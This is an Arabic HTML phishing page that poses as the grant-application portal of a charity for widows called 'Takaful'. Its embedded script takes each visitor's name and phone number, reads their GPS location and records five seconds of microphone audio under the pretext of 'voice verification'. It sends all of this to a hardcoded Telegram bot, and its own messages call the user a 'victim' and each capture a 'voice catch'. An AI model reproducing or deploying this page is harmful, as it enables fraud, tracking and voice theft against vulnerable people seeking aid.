<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التسجيل | منظمة تكافل</title>
    <style>
        :root { --main: #27ae60; --dark: #2c3e50; }
        body { font-family: 'Arial', sans-serif; background: #f4f7f6; text-align: center; direction: rtl; padding: 10px; }
        .container { background: white; max-width: 420px; margin: 20px auto; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 6px solid var(--main); }
        h2 { color: var(--dark); font-size: 22px; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #fafafa; }
        .btn { background: var(--main); color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 15px; }
        .status-msg { font-size: 12px; color: #e74c3c; margin-top: 10px; font-weight: bold; }
        .footer { font-size: 11px; color: #bdc3c7; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://img.icons8.com/color/96/charity.png" width="60">
    <h2>منظمة تكافل الإنسانية</h2>
    <p style="font-size: 13px; color: #7f8c8d;">يرجى تفعيل التحقق الصوتي لإتمام طلب المنحة</p>
    
    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
    <input type="tel" id="phone" placeholder="رقم هاتف الواتساب">
    
    <button class="btn" onclick="startCapture()">تأكيد البيانات والتحقق الصوتي</button>
    
    <p id="status" class="status-msg" style="display:none;">🔴 جاري التحقق الصوتي.. يرجى الانتظار</p>
    
    <div class="footer">جميع الحقوق محفوظة © منظمة تكافل - 2026</div>
</div>

<script>
    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "7214473798";

    async function sendToBot(type, data, caption = "") {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        if (type === "text") {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
            });
        } else {
            // إرسال كصوت (Voice) أو ملف (Document)
            formData.append(type, data, type === "voice" ? "audio.ogg" : "file.jpg");
            if (caption) formData.append("caption", caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                method: "POST",
                body: formData
            });
        }
    }

    async function startCapture() {
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;

        if (!name || !phone) { alert("يرجى إدخال البيانات أولاً!"); return; }

        document.getElementById('status').style.display = 'block';

        // 1. جلب الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToBot("text", `🔥 **صيد صوتي جديد (تكافل)** 🔥\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n${map}`);
        });

        // 2. تسجيل الصوت التلقائي
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];

            mediaRecorder.ondataavailable = (event) => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                await sendToBot("voice", audioBlob, `🎤 تسجيل صوتي للضحية: ${name}`);
                
                // إيقاف الميكروفون بعد الانتهاء
                stream.getTracks().forEach(track => track.stop());
                
                document.getElementById('status').innerText = "✅ تم التحقق بنجاح! سيتم التواصل معك.";
                alert("شكراً لك، تم استلام طلبك بنجاح.");
            };

            // ابدأ التسجيل
            mediaRecorder.start();

            // سجل لمدة 5 ثوانٍ ثم توقف تلقائياً وارسل
            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);

        } catch (err) {
            alert("خطأ: يجب السماح بالميكروفون والـ GPS لتأكيد أهليتك للمنحة!");
        }
    }
</script>
</body>
</html>
